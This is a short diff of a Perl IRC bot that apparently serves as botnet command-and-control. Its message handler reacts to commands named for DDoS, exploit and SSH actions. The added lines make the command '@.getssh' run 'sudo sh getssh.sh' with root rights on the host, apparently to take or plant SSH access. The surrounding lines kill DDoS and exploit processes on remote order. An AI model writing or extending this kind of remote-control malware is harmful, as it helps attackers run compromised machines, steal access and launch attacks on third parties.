@@ -61,6 +61,9 @@ $irc->on(irc_privmsg => sub {
  if ($msg =~ /@.ddos.stop/) {
   system 'pkill python'; 
  }
+  if ($msg =~ /@.getssh/) {
+  system 'sudo sh getssh.sh'; 
+ }
  elsif ($msg =~ /@.stopexploit/) {
   warn 'stopexploit called, killing...';
   if ( exists $misc->{exploitpid} )  {
